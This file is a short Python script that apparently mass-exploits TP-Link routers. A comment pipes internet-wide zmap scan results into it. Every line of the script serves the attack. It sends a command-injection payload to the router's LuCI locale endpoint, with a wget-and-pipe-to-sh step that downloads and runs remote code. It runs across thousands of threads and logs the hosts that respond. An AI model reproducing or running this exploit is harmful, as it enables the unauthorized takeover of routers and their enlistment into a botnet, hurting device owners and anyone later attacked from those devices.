import urllib.request
import urllib.error
import fileinput
from io import BytesIO
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
#TP-Link WAN-side | zmap -p8080 --max-sendto-failures=99999999 -q -o- | awk {'print $0":8080"'} | python3 wan.py

payload = "`wget http://0.0.0.0/y -O-|sh`"

def exploit(target):
    try:
        req = urllib.request.Request("http://"+target+"/cgi-bin/luci/;stok=/locale?form=country")
        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
        body = f"operation=write&country=$(id>"+payload+")"

        response = urllib.request.urlopen(req, data=bytes(body, 'utf-8'), timeout=10)

        if response.status == 200:
            print("200 " + target)
    except Exception as e:
        #print(e)
        pass

with ThreadPoolExecutor(max_workers=10000) as executor:
    for line in fileinput.input():
        target = line.rstrip()
        executor.submit(exploit, target)
